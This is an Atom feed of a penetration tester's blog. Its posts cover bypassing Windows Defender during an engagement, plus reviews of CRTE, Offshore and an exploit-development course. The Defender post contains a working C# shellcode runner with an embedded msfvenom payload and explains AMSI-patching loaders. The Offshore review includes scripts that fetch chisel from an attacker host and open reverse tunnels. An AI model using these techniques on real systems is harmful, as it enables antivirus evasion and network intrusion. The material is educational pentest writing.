<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-08T15:26:08+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">arty-hlr</title><entry><title type="html">How to bypass Defender in a few easy steps</title><link href="http://localhost:4000/2021/05/06/how-to-bypass-defender/" rel="alternate" type="text/html" title="How to bypass Defender in a few easy steps" /><published>2021-05-06T00:00:00+02:00</published><updated>2021-05-06T00:00:00+02:00</updated><id>http://localhost:4000/2021/05/06/how-to-bypass-defender</id><content type="html" xml:base="http://localhost:4000/2021/05/06/how-to-bypass-defender/"><![CDATA[<p>In a recent pentest I had the opportunity to spend a bit of time in a windows VM in an AD environment via RDP to test their hardening. Along the way, from very basic techniques to some more advanced ones, I learned a lot about DotNet, how antivirus engines work, and how to bypass them. I did manage to bypass Defender in the pentest, and run some nice stuff, and wanted to make a blog post for people who like me a few days ago had very little experience with bypassing antivirus software. Enjoy your stay :)</p>

<h1 id="basics-of-how-av-works">Basics of how AV works</h1>

<p>Before we dive in in which solutions I tried, let’s recap a bit on how AV works with files on disk (no AI, basics):</p>
<ul>
  <li>signature detection</li>
  <li>heuristics detection</li>
  <li>in memory detection</li>
</ul>

<h2 id="signatures">Signatures</h2>

<p>The basic functionality and earliest one was to compare the hash of a file, or part of a file, with hashes of known malicious files. This can be the hash of the whole file, or just from a few bytes or strings that are at the core of the malicious activity.</p>

<h2 id="heuristics">Heuristics</h2>

<p>The next level in antivirus school when signatures or not enough, is thinking about emulating the executable that wants to run <em>before</em> it is actually run. That means going through the assembly instructions or lines of code, and checking what happens when they are run. Based on the behaviour observed, the AV can decide a file is malicious and not allow the file to run after having been emulated.</p>

<h2 id="what-happens-when-stuff-is-not-on-disk">What happens when stuff is not on disk?</h2>

<p>One last important thing to mention is AMSI: the response of Microsoft to malicious software not even touching the disk. When an executable on disk is run, it is scanned/emulated before being allowed to run, but what happens if that executable is already in memory and loaded from somewhere else? AMSI is a Windows API that allows developers of software that allows execution of scripts for example (think PowerShell, VBA macros in Office, reflection for C# assembly) to request an AMSI scan before letting the thing in memory run.</p>

<h1 id="first-approach-changing-strings-and-obfuscation">First approach: Changing strings and obfuscation</h1>

<p>So let’s try to bypass the first layer of AV: signature detection. My first attempt was to run my C# SharpHound.exe for example through <a href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a>, <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1">Find-AVSignature</a>, and manual scans on <a href="https://antiscan.me/">AntiScan.me</a> and <a href="https://www.virustotal.com/gui/">VirusTotal</a> to try to find out what part of the code was triggering the AV software. Through trial and error, and going through smaller and smaller parts of the file, you can find out what strings trigger AV to refactor those string in Visual Studio, or change individual bytes of the executable. The downside of the last method is that it will most likely break the executable as assembly instructions are overwritten, and needs reverse engineering to figure out what exactly was changed and whether it can be fixed, which takes time and effort staring at disassembled binary code. Not great, we’re lazy, and we’d have to do that for each AV software we want to bypass. Meh.</p>

<p>Another method, try to change the code so much that it doesn’t look like anything anymore. I mean, try to obfuscate the code. Such tools as <a href="https://github.com/mkaring/ConfuserEx">ConfuserEx</a> can do this for .Net applications. This works to a certain extent, and could have been enough some years ago, but nowadays still doesn’t bypass any heuristics detection. Well, it was worth a try.</p>

<h1 id="second-approach-homemade-c-runner">Second approach: Homemade C# runner</h1>

<p>My next attempt shames me a bit. But here’s what I tried: I knew of shellcode runners to execute msfvenom generated payloads in C# thanks to WinAPI calls. The basic runner code looks like this:</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Diagnostics</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Net</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Threading</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">Shellcode_Runner</span>
<span class="p">{</span>
    <span class="k">class</span> <span class="nc">Program</span>
    <span class="p">{</span>
        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">,</span> <span class="n">ExactSpelling</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
        <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwSize</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flProtect</span><span class="p">);</span>

        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
        <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">CreateThread</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpParameter</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwCreatingFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadId</span><span class="p">);</span>

        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
        <span class="k">static</span> <span class="k">extern</span> <span class="n">UInt32</span> <span class="nf">WaitForSingleObject</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hHandle</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwMilliseconds</span><span class="p">);</span>

        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">// msfvenom -p windows/exec cmd=calc.exe exitfunc=thread -a x64 -f base64</span>
            <span class="kt">string</span> <span class="n">b64_payload</span> <span class="p">=</span> <span class="s">"/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA"</span><span class="p">;</span>
            <span class="kt">byte</span><span class="p">[]</span> <span class="n">buf</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Convert</span><span class="p">.</span><span class="nf">FromBase64String</span><span class="p">(</span><span class="n">b64_payload</span><span class="p">);</span>

            <span class="kt">int</span> <span class="n">size</span> <span class="p">=</span> <span class="n">buf</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span>
            <span class="n">IntPtr</span> <span class="n">addr</span> <span class="p">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0x1000</span><span class="p">,</span> <span class="m">0x3000</span><span class="p">,</span> <span class="m">0x40</span><span class="p">);</span>
            <span class="n">Marshal</span><span class="p">.</span><span class="nf">Copy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
            <span class="n">IntPtr</span> <span class="n">hThread</span> <span class="p">=</span> <span class="nf">CreateThread</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
            <span class="n">Thread</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="m">10000</span><span class="p">);</span>
            <span class="nf">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="m">0xFFFFFFFF</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>And little me thought, well if I can run shellcode with it, why not try to load the whole EXE file in base64 and have it executed like shellcode. I mean why wouldn’t it work? :D Obviously, I noticed after a few failed attempts that EXE and especially C# compiled EXE were <strong>not</strong> shellcode, and that <em>obviously</em> loading the whole EXE to be executed as assembly instructions would not work, just because of the PE headers, never mind how C# is actually compiled, I remembered some time into trying that it was a managed languaged and compiled into intermediary code… Even my efforts to transform it to shellcode with <a href="https://github.com/hasherezade/pe_to_shellcode">pe_to_shellcode</a> which changes the PE header to be executable (obviously not gonna work with C# still) or <a href="https://github.com/TheWover/donut">Donut</a> (which should have worked? no idea why not) did not bring any fruit.</p>

<p>BUT, I wrote a shellcode runner! The next step would have been to work on escaping signature detection by encrypting the payload, and heuristics detection by messing with our behaviour (which will be the subject of another blog post probably where I focus on bypassing AV for shellcode without the solution I ended up using here). So, onto my next attempt.</p>

<h1 id="third-approach-payload-delivery">Third approach: Payload delivery</h1>

<p>So if I can’t obfuscate enough a C# executable, or go around the heuristics analysis by running it as shellcode, maybe there’s another way to not touch the disk. I had used <a href="https://github.com/Flangvik/NetLoader">NetLoader</a> before during the CRTE bootcamp, without really understanding what it did and what it was for, but let’s dive in (a bit) now:</p>

<p>NetLoader is a C# tool that loads C# assembly from a path, URL, or SMB share via reflection (a topic for another blog post problaby, but see it as a shellcode runner but for C# assembly) and patches AMSI to bypass it. This means that the malicious C# executable doesn’t have to touch the disk at all, which is a good thing for us, and as it bypasses AMSI (another topic for a later blogpost), this could mean bypassing Defender completely. The only thing is, will it be allowed to run? Well, apparently Microsoft hasn’t added a signature for NetLoader, because it is!</p>

<p>First success: running any malicious C# executable!
<img src="http://localhost:4000/assets/images/run_exe.png" alt="SharpHound.exe run successfully" /></p>

<p>But that wasn’t enough for me, I wanted to be able to run PowerShell scripts as well… but that didn’t work with NetLoader, so onto another tool for payload delivery and AMSY bypass, <a href="https://github.com/mdsecactivebreach/SharpPack">SharpPack</a>:</p>

<p>SharpPack needed a bit of refactoring for my purposes, as the project compiles to a DLL by default, which makes sense for more opsec safe ways, like <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a> or in an Office VBA macro, as described in <a href="https://www.mdsec.co.uk/2018/12/sharppack-the-insider-threat-toolkit/">this</a> blog post, but I just wanted a normal C# executable that I would then run with NetLoader.</p>

<p>I changed the project to compiling to an exe, and added a main:</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">SharpPack</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">SharpPackRunner</span>
<span class="p">{</span>
    <span class="k">class</span> <span class="nc">Program</span>
    <span class="p">{</span>
        <span class="k">static</span> <span class="k">void</span> <span class="nf">usage</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="n">System</span><span class="p">.</span><span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Usage: SharpPackRunner.exe -D/-P &lt;encpath&gt; &lt;encpass&gt; &lt;outfile&gt; &lt;name&gt; &lt;args&gt;"</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">Length</span> <span class="p">!=</span> <span class="m">6</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="nf">usage</span><span class="p">();</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="kt">var</span> <span class="n">sp</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">SharpPackClass</span><span class="p">();</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="nf">Equals</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="m">0</span><span class="p">],</span> <span class="s">"-D"</span><span class="p">))</span>
                <span class="n">sp</span><span class="p">.</span><span class="nf">RunDotNet</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="m">1</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="m">2</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="m">3</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="m">4</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="m">5</span><span class="p">]);</span>
            <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="nf">Equals</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="m">0</span><span class="p">],</span> <span class="s">"-P"</span><span class="p">))</span>
                <span class="n">sp</span><span class="p">.</span><span class="nf">RunPowerShell</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="m">1</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="m">2</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="m">3</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="m">4</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="m">5</span><span class="p">]);</span>
            <span class="k">else</span>
                <span class="nf">usage</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>
<p>(I was looking for a more elegant solution like unpacking an array into arguments like <code class="language-plaintext highlighter-rouge">*array</code> in python, but apparently this is not possible in C# without refactoring the method)</p>

<p>So I ended up with a C# executable that I could run with NetLoader, and that can extract a C# malicious executable or PowerShell script from an encrypted zip file, run it, and send the output to a text file. The code can probably be changed to load executables and scripts from a URL or share like NetLoader and show the output instead of sending it to a text file so that nothing is on disk at all, but it didn’t have that much time to dive into the source code to be honest.</p>

<p>I added a line at the end of the SharpHound.ps1 script with <code class="language-plaintext highlighter-rouge">Invoke-BloodHound -CollectionMethod All</code> to load and run SharpHound (although reading MDSec’s blogpost again I could have given that line as the last argument to SharpPack probably), and could now run PowerShell scripts!</p>

<p><img src="http://localhost:4000/assets/images/run_powershell.png" alt="SharpHound.ps1 run successfully" /></p>

<p>My quest was complete!</p>

<h1 id="conclusion">Conclusion</h1>

<p>I did manage to bypass Defender, and I learned a lot of things about antivirus software in the process, but I didn’t dive very deep into bypassing AMSI and the reflection mechanism in C#, which could be the topics of future blog posts. I hope this post was clear enough, if I made any mistake in explaining, let me know in an issue or on Discord (arty-hlr#1427)!</p>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[What one can learn about AV bypass during a pentest!]]></summary></entry><entry><title type="html">CRTE Bootcamp Review</title><link href="http://localhost:4000/2021/02/15/crte-review/" rel="alternate" type="text/html" title="CRTE Bootcamp Review" /><published>2021-02-15T00:00:00+01:00</published><updated>2021-02-15T00:00:00+01:00</updated><id>http://localhost:4000/2021/02/15/crte-review</id><content type="html" xml:base="http://localhost:4000/2021/02/15/crte-review/"><![CDATA[<p>After a friend of mine went through CRTP, and my Offshore experience, I felt like I wanted to go further with windows and AD stuff in general, and consolidate what I had learnt during Offshore. That was about the time PentesterAcademy announced they were launching bootcamps, the first for AD beginners was in December, and they would have an advanced AD bootcamp centred on CRTE in January, so I jumped on it, along with my friend.</p>

<h1 id="bootcamp">Bootcamp</h1>

<p>The bootcamp consisted of 4 sessions of 3 hours on Zoom with <a href="https://twitter.com/nikhil_mitt">Nikhil</a>, once per Sunday evening in the CET time zone, along with slides, and recordings of the live sessions if it’s too late where you live. Additionally, we all got access to a Discord server managed by Nikhil.</p>

<p>It started pretty easy, and probably a good deal of overlap with CRTP, but quickly went into Exchange, MSSQL, and Azure related attacks, plus a lot of cross-domain and cross-forest specific attacks. Overall the materials were very good and well explained, and having live sessions and access to the Discord server meant we could ask questions and have Nikhil answer them pretty quickly, and have some connection to the other people taking the bootcamp. The 3-hours sessions were long and strenuous sometimes, but having the recording meant we could go through them with the slides again at our own pace along with the lab during the week, which was very nice. Also, we got to see Nikhil drawing live:</p>

<p><img src="http://localhost:4000/assets/images/nikhil-drawing.png" alt="Nikhil explaining database links" /></p>

<h1 id="labs">Labs</h1>

<p>We also had 30 days of access to the CRTE labs (or something that resembles the CRTE labs a lot), where we could implement the enumeration and abuses we were learning during the bootcamp. We received a full lab manual, and Nikhil later released a Covenant lab manual, which was great to get to know this C2 better. Nikhil spent a lot of time during the sessions emphasizing OPSEC and how to avoid logging and detection, which was great and covered some nice tools and new ways to bypass. Obviously, I forgot all of it and was noisy <strong>AF</strong> in my exam.</p>

<p>At the end of the labs, we had gone through several domains and forests, trusts and links all around them, and the paths we took looked like that: (blurred to hide machine names and actual attacks)</p>

<p><img src="http://localhost:4000/assets/images/crte-labs.png" alt="CRTE labs attack paths" /></p>

<p>Having such a detailed lab manual was a blessing and a curse at the same time though, it was easy to refer to it or the slides for commands, tools, or particular abuses, but I procrastinated doing the labs a lot. Comparing with my Offshore experience, where there was 0 lab manual, I think I was not used to being spoon-fed the lab, and wanted to have to try harder, had to fight that a bit. In the end I completed the whole lab the manual way, and did it again on the last few days of our lab access using Covenant, which taught me a lot I could have used during Offshore!</p>

<h1 id="exam">Exam</h1>

<p>The exam was a 48 hours hands-on exam, with 6 machines (when I took it), of which we had to attain remote code execution on at least 3. I actually stressed myself timewise a bit more than I had to as I thought we had 48 hours to do the exam and write the report, well, turns out, it was 48 hours for the exam, and 48 hours more to write the report! But well, on the other hand I got a nice weekend.</p>

<p>I started my exam the day after our lab access ended early in the morning, and thus began at least 30 hours of sufferance through 6 machines and a few domains. Without saying too much, there were stuff we saw in the bootcamp, some stuff we didn’t and had to learn during the exam, and a lot of moments I was banging my head on the desk. Any sense of OPSEC flew out of the window to be completely honest, any blue teamer on the other side would have seen me coming a few km away, and I focused on being able to own all machines before the end of the 48 hours. But at last with an evening to spare before sending the report, all machines owned, I could finally rest, the night had been short.</p>

<h1 id="review">Review</h1>

<p>Overall, I would say that having live sessions was a very nice bonus to normal courses, and Nikhil could answer everything we threw at him. The normal and Covenant lab manuals were a good guide for the labs as well, and Nikhil showed most attacks and abuses in the sessions.</p>

<p>I would recommend the CRTE bootcamp (if Nikhil continues it in the future) to anyone familiar with AD, but wanting to go further and consolidate their knowledge of AD attacks. There was probably a good deal of overlap with CRTP material, but from what others said who took both, it was still worth it as it went much further in some areas, introduced new concepts, and was more focused on OPSEC. <strong>BUT</strong>, if you’re more the type to learn along the way, opt for the normal CRTE lab+exam instead. It really depends on your learning type. Otherwise, future bootcamps are <a href="https://bootcamps.pentesteracademy.com/">here</a>!</p>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[A review of Altered Security's advanced AD course]]></summary></entry><entry><title type="html">Offshore Review</title><link href="http://localhost:4000/2020/12/25/offshore-review/" rel="alternate" type="text/html" title="Offshore Review" /><published>2020-12-25T00:00:00+01:00</published><updated>2020-12-25T00:00:00+01:00</updated><id>http://localhost:4000/2020/12/25/offshore-review</id><content type="html" xml:base="http://localhost:4000/2020/12/25/offshore-review/"><![CDATA[<h1 id="intro">Intro</h1>

<p>December was gonna be another month of lockdown at home without much to do, so after a friend pwned it, and some nice troll from the InfoSec Prep discord started it, I decided to follow suit and to dedicate the month to <a href="https://www.hackthebox.eu/home/labs/pro/view/2">Offshore</a>! Unfortunately I was a bit impatient, bought the lab access on the 1st of December at midnight, turned out that they had a 50% discount from the 1st of December, which was rolled out during the day, so missed that 😅</p>

<h1 id="getting-up-to-speed-with-active-directory">Getting up to speed with Active Directory</h1>

<p>I had dedicated the last 2 weeks of November to get up to speed with Active Directory and the attacks on it, I used <a href="https://www.pentesteracademy.com/course?id=47">Attacking and Defending Directory</a> from PentesterAcademy (which is what comes bundled up with CRTP), the AD section of Heath Adam’s Practical Ethical Hacking Udemy <a href="https://www.udemy.com/course/practical-ethical-hacking/">course</a>, and various blog posts about specific attacks I found after googling around a bit. Overall it was very much needed, as my first and last interaction with AD was with the HTB Forest box, which I had done while it was active, but with way too many hints, and without understanding what I was doing. Putting words in my head behind how Kerberos works, what kerberoasting or asreproasting is, how to get golden/silver ticket, etc helped a lot understanding the basics.</p>

<p>I even made my own little AD lab first on Azure, then at home, to follow along some attacks on Heath Adams’ course and to experiment a bit. Some resources for that <a href="https://csenox.github.io/active-directory/2020/10/07/AD-Lab/">here</a>, <a href="https://medium.com/@vartaisecurity/lab-building-guide-virtual-active-directory-5f0d0c8eb907">here</a>, <a href="https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f">here</a>, <a href="https://medium.com/swlh/building-an-active-directory-lab-part-1a-automatedlab-fc2399ebe5be">here</a>, <a href="https://social.technet.microsoft.com/wiki/contents/articles/36438.windows-server-2016-build-a-windows-domain-lab-at-home-for-free.aspx">here</a>, and <a href="https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/">here</a>.</p>

<p>I decided to take the opportunity to learn some new tools, so I set up <a href="https://obsidian.md/">Obsidian</a> for note taking, and <a href="https://github.com/cobbr/Covenant">Covenant</a> as a C2. Spoiler, I ended up using more often metasploit than covenant as a C2 haha! Also set up a <a href="https://github.com/fireeye/commando-vm">Commando VM</a> that could access my covenant server running on my Parrot machine, ended up doing everything from Parrot…</p>

<h1 id="week-1-baby-steps">Week 1: Baby steps</h1>

<p>Armed with my new found AD knowledge, I started Offshore… and didn’t see any AD attacks for a while 😅 There was some web attacks, a first pivot using SSH, some looking around making lots of noise (a blue teamer in charge of the offshore domains would have been able to run circles around me :P). But making friends along the way especially in the HTB discord server, we got together for some challenges, and I was at 25% at the end of my first week, on track to finish by Christmas!</p>

<h1 id="week-2-pivoting">Week 2: Pivoting…</h1>

<p>The first domain owned, started the pivoting game, and the AD attacks. It took me a few hours to find the best solutions for pivoting through the domains, using this <a href="https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/">post</a> which was very thorough in the many ways a red teamer can pivot through a network, and tired of having to type commands over and over, I decided to script my pivoting, and here’s the result: (spoiler free and re-usable)</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">pivot2.sh</code> to serve chisel64.exe, pipe the powershell script to evil-winrm, and set the proxychains config for this DC:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-ne</span> 1 <span class="o">]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s1">'-s[tart]/-r[un]'</span>
    <span class="nb">exit
</span><span class="k">fi

</span><span class="nb">sudo sed</span> <span class="nt">-i</span> <span class="s1">'s/127\.0\.0\.1 108./127\.0\.0\.1 1080/'</span> /etc/proxychains.conf

<span class="k">if</span> <span class="o">[[</span> <span class="nv">$1</span> <span class="o">=</span> <span class="s1">'-s'</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s1">'[+] Serving on port 8000...'</span>
    python3 <span class="nt">-m</span> http.server 8000 <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 &amp;
    <span class="nb">cat </span>pivot2_s.ps1 | evil-winrm <span class="nt">-u</span> administrator <span class="nt">-H</span> YOUTHOUGHTYOUDSEEAHASHDIDNTYOU <span class="nt">-i</span> 172.16.X.X
<span class="k">else
    </span><span class="nb">cat </span>pivot2_r.ps1 | evil-winrm <span class="nt">-u</span> administrator <span class="nt">-H</span> YOUTHOUGHTYOUDSEEAHASHDIDNTYOU <span class="nt">-i</span> 172.16.X.X
<span class="k">fi</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">pivot2_s.ps1</code> to upload and run the chisel client on the DC:</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set-MpPreference -DisableRealtimeMonitoring $true</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="o">..</span><span class="nx">/appdata/local/temp</span><span class="w">
</span><span class="n">curl</span><span class="w"> </span><span class="nt">-outf</span><span class="w"> </span><span class="nx">chisel.exe</span><span class="w"> </span><span class="nx">http://10.10.14.XX:8000/chisel64.exe</span><span class="w">
</span><span class="o">.</span><span class="n">/chisel</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="nx">10.10.14.XX:12345</span><span class="w"> </span><span class="nx">R:1080:socks</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">pivot2_r.ps1</code> to run the chisel client if it’s already uploaded:</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set-MpPreference -DisableRealtimeMonitoring $true</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="o">..</span><span class="nx">/appdata/local/temp</span><span class="w">
</span><span class="o">.</span><span class="n">/chisel</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="nx">10.10.14.XX:12345</span><span class="w"> </span><span class="nx">R:1080:socks</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">pivot3.sh</code> to kill the HTTP server, launch the chisel server, and change the proxychains config for the new pivot:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

ps <span class="nt">-aux</span> | <span class="nb">grep </span>http.server | <span class="nb">grep </span>8000 | <span class="nb">grep</span> <span class="nt">-P</span> <span class="s1">'\d+'</span> <span class="nt">-o</span> | <span class="nb">head</span> <span class="nt">-1</span> | xargs <span class="nb">kill </span>2&gt;&amp;1 <span class="o">&gt;</span> /dev/null
<span class="nb">sudo sed</span> <span class="nt">-i</span> <span class="s1">'s/127\.0\.0\.1 108./127\.0\.0\.1 1081/'</span> /etc/proxychains.conf
chisel server <span class="nt">-p</span> 12345 <span class="nt">-reverse</span>
</code></pre></div></div>

<p>You’re welcome to steal those short scripts and adapt them for your pivoting needs! As I would get to know, I’d need a few of those to pivot through all the domains, in total 4 pivots!</p>

<h1 id="week-3-ad-attacks-are-yummy">Week 3: AD Attacks are yummy</h1>

<p>Cross domain and cross forest attacks were kinda new to me but I had a blast learning them! Also, ACLs can hide many juicy things :P Bloodhound was a lot of help in finding out how to abuse some ACLs and trusts, I wish I had used <a href="https://exploit.ph/powerview.html">PowerView</a> more though and enumerated some stuff manually, would have prevented a lot of VM lagging and crashes because well I had obsidian, covenant, discord, and bloodhound running at the same time… But still learned a lot along the way, and the 3rd week was the 3rd quarter syndrome a bit, seeing how much work I had done, and seeing I had about the same amount still to do, and Christmas approaches…</p>

<h1 id="week-4-flag-hunt">Week 4: Flag hunt</h1>

<p>Total domain pwnage! I had owned all offshore domains… and was still missing a few flags. So on the enumeration hunt I went, trying to find some hidden flags, and turns out one of those was actually from a challenge that had been removed! Thanks to Ippsec for the help taking care of that!</p>

<p>24th of December, 3 PM, all domain flags in the pocket, getting ready for Christmas cooking… and still lacking one linux machine! This one turned up to be a bit of a closed beast, but was a very nice programming challenge, and I enjoyed writing the script to get the privesc on it, but that was on the 25th. So in the end Offshore completed, just on Christmas day :D And a nice certificate as a gift!</p>

<p><img src="http://localhost:4000/assets/images/offshore-certificate.png" alt="Offshore Certificate" /></p>

<h1 id="review">Review</h1>

<p>Overall I learned during my Offshore journey, some challenges were frustrating, some required a bit of help, I won’t hide it, I made good friends along the way, and I’m very happy I could finish it under a month. I would recommend Offshore to all pentesters/hackers who want some more hands-on experience with AD attacks, and pivoting through networks, and who are not shy of googling stuff until it works. Very long but very good experience, looking forward to doing more AD related stuff in the future!</p>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[My journey through HTB's Offshore Pro Lab!]]></summary></entry><entry><title type="html">eLearnSecurity Certified eXploit Developer Review</title><link href="http://localhost:4000/2020/12/15/ecxd-review/" rel="alternate" type="text/html" title="eLearnSecurity Certified eXploit Developer Review" /><published>2020-12-15T00:00:00+01:00</published><updated>2020-12-15T00:00:00+01:00</updated><id>http://localhost:4000/2020/12/15/ecxd-review</id><content type="html" xml:base="http://localhost:4000/2020/12/15/ecxd-review/"><![CDATA[<h1 id="update-25012021">Update 25.01.2021</h1>

<p>In the year or so since this blog post, eLS has been acquired by INE, the courses are now only available as a subscription on <a href="https://ine.com/">INE</a>’s website. Also, OffSec has launched a basic exploit dev course of their own <a href="https://www.offensive-security.com/exp301-osed/">here</a> focused on windows, which still doesn’t cover x64 though, but seems very thorough on many other aspects, if you’re starting out with windows exploit dev, I now recommend going for OSED.</p>

